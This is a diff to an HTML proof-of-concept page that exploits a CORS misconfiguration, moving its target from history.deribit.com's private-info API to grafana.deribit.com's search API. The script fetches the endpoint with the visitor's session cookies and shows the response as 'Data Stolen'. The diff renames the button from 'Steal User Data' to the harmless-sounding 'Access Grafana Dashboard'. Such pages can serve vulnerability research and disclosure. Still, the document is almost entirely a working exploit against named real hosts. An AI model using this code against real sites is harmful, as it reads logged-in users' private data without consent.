@@ -3,30 +3,27 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exploit for CORS Misconfiguration</title>
+  <title>Exploit for grafana.deribit.com</title>
 </head>
 <body>
 
-<h1>Exploit for CORS on history.deribit.com</h1>
+<h1>Exploit for CORS on grafana.deribit.com</h1>
 
-<button id="exploitButton">Steal User Data</button>
+<button id="exploitButton">Access Grafana Dashboard</button>
 
 <script>
   document.getElementById('exploitButton').addEventListener('click', function() {
-    fetch('https://history.deribit.com/api/private-info', {
-      credentials: 'include' // Sends user session cookies with the request
+    fetch('https://grafana.deribit.com/api/search', {
+      credentials: 'include' // Sends session cookies with the request
     })
-    .then(response => {
-      console.log('Response Headers:', Array.from(response.headers.entries()));
-      return response.text();
-    })
+    .then(response => response.json())
     .then(data => {
-      console.log('%cData Stolen from history.deribit.com:', 'color: red', data);
-      document.body.innerHTML += `<h3>Data retrieved from /api/private-info:</h3><pre>${data}</pre>`;
+      console.log('Data Stolen from grafana.deribit.com:', data);
+      alert('Data retrieved: ' + JSON.stringify(data));
     })
     .catch(error => {
       console.error('Error:', error);
-      document.body.innerHTML += `<h3 style="color: red;">Error fetching data from /api/private-info</h3>`;
+      alert('Failed to fetch data.');
     });
   });
 </script>
